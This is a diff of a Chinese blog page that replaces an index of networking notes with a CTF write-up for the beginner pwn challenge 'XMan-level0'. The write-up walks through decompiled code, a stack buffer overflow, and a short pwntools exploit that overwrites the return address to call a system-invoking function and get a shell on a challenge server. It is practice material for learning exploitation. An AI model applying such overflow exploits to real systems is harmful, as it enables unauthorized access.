@@ -6,16 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://thriumph.top">
-  <title>Thriumph</title>
+  <title>XMan-level0 | Thriumph</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="keywords" content="pwn,re,渗透测试">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Thriumph">
-<meta property="og:url" content="https://thriumph.top/page/4/index.html">
+  <meta name="description" content="一道简单的溢出。自从被自己菜到，决定一天一道pwn的时候，选择了从攻防世界的新手区做起，刚开始的几题挺简单的，希望以后可以继续坚持下去每日一题ヾ(≧▽≦*)o">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XMan-level0">
+<meta property="og:url" content="https://thriumph.top/XMan-level0.html">
 <meta property="og:site_name" content="Thriumph">
+<meta property="og:description" content="一道简单的溢出。自从被自己菜到，决定一天一道pwn的时候，选择了从攻防世界的新手区做起，刚开始的几题挺简单的，希望以后可以继续坚持下去每日一题ヾ(≧▽≦*)o">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://thriumph.top/XMan-level0/1.png">
+<meta property="og:image" content="https://thriumph.top/XMan-level0/2.png">
+<meta property="og:updated_time" content="2019-10-20T14:30:00.002Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Thriumph">
+<meta name="twitter:title" content="XMan-level0">
+<meta name="twitter:description" content="一道简单的溢出。自从被自己菜到，决定一天一道pwn的时候，选择了从攻防世界的新手区做起，刚开始的几题挺简单的，希望以后可以继续坚持下去每日一题ヾ(≧▽≦*)o">
+<meta name="twitter:image" content="https://thriumph.top/XMan-level0/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Thriumph" type="application/atom+xml">
   
@@ -153,16 +160,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-应用层" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-XMan-level0" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/应用层.html">应用层</a>
+    <h1 class="article-title" itemprop="name">
+      XMan-level0
     </h1>
   
 
@@ -170,22 +175,40 @@
         
         <!--显示阅读次数-->
         
+          <br/>
+          <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+          <span class="icon-sort"></span>
+          <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+                    阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+          </span>
+          </a>
+        
         <!--显示阅读次数完毕-->
 
 
         
-        <a href="/应用层.html" class="archive-article-date">
-  	<time datetime="2019-06-06T15:03:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-06</time>
+        <a href="/XMan-level0.html" class="archive-article-date">
+  	<time datetime="2019-10-20T12:28:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-20</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>《计算机网络自顶向下方法》第二章读书笔记</p>
-        
-          <a class="article-more-a" href="/应用层.html#more">more >></a>
-        
+        <p>一道简单的溢出。<br>自从被自己菜到，决定一天一道pwn的时候，选择了从攻防世界的新手区做起，刚开始的几题挺简单的，希望以后可以继续坚持下去每日一题ヾ(≧▽≦*)o</p>
+<a id="more"></a>
+<h1 id="查看文件信息"><a href="#查看文件信息" class="headerlink" title="查看文件信息"></a>查看文件信息</h1><p><img src="/XMan-level0/1.png" alt><br>只开启了NX保护</p>
+<h1 id="ida查看"><a href="#ida查看" class="headerlink" title="ida查看"></a>ida查看</h1><p><strong>main函数：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很简单，输出helloworld然后调用vulnerable_function()函数。</p>
+<p><strong>查看vulnerable_function()函数</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>buf是80h,栈上可以需要覆盖返回地址，因为是64为，需要覆盖80h+8h,也就是88h,然后就能调用想要调用的地址了。<br><strong>查看callsystem函数</strong><br><img src="/XMan-level0/2.png" alt><br>调用了system函数，所以覆盖返回地址为system的地址就行了。system地址是0x400596</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="string">'41896'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x88</span>+p64(<span class="number">0x400596</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
       
       
       <!- 百度自动推送方式提交 -->
@@ -212,7 +235,24 @@
 
       
       
-        <div class="declare" hidden="hidden"></div>
+        <div class="declare">
+          <strong>本文作者：</strong>
+          
+            Thriumph
+          
+          <br>
+          <strong>本文链接：</strong>
+          https://thriumph.top/XMan-level0.html
+          <br>
+          <strong>版权声明：</strong>
+          本作品采用
+          <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>
+          进行许可。转载请注明出处！
+          
+            <br>
+            <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png"/></a>
+          
+        </div>
       
 
 
@@ -227,11 +267,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">读书笔记</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机网络</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
         		</li>
       		
 		</ul>
@@ -240,16 +280,75 @@
     
 
     
-      <p class="article-more-link">
-        <a class="article-more-a" href="/应用层.html">展开全文 >></a>
-      </p>
-    
 
+    
+      
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://thriumph.top//XMan-level0.html" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
     
     <div class="clearfix"></div>
   </div>
 </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/Roalctf-polyre.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Roalctf-polyre</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -264,133 +363,34 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-
-
-
-
-  
-  
-  
-    <article id="post-计算机网络和因特网" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/计算机网络和因特网.html">计算机网络和因特网</a>
-    </h1>
-  
-
-
-        
-        <!--显示阅读次数-->
-        
-        <!--显示阅读次数完毕-->
-
-
-        
-        <a href="/计算机网络和因特网.html" class="archive-article-date">
-  	<time datetime="2019-06-06T14:59:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>《计算机网络自顶向下方法》第一章读书笔记<br>自顶向下方法挺通俗易懂的٩(๑òωó๑)۶</p>
-        
-          <a class="article-more-a" href="/计算机网络和因特网.html#more">more >></a>
-        
-      
-      
-      <!- 百度自动推送方式提交 -->
-      
-        <script>
-        (function(){
-            var bp = document.createElement('script');
-            var curProtocol = window.location.protocol.split(':')[0];
-            if (curProtocol === 'https') {
-                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-            }
-            else {
-                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-            }
-            var s = document.getElementsByTagName("script")[0];
-            s.parentNode.insertBefore(bp, s);
-        })();
-        </script>
-      
-      <!- 百度自动推送方式提交结束 -->
-
-
-
-
-      
-      
-        <div class="declare" hidden="hidden"></div>
-      
-
-
-
-      
-    </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">读书笔记</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机网络</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-      <p class="article-more-link">
-        <a class="article-more-a" href="/计算机网络和因特网.html">展开全文 >></a>
-      </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-</div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#查看文件信息"><span class="toc-number">1.</span> <span class="toc-text">查看文件信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ida查看"><span class="toc-number">2.</span> <span class="toc-text">ida查看</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">3.</span> <span class="toc-text">exp</span></a></li></ol>
+                    </div>
+                </span>
             </div>
         </div>
         
-        
     </div>
 </aside>
 
 
 
+  
+  
+  
+
+  
+
+  
+
+  
+
 
 
 
@@ -398,14 +398,6 @@
 
   
   
-  
-  
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
-    </nav>
-  
-
-
           </div>
         </div>
       </div>
@@ -444,8 +436,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
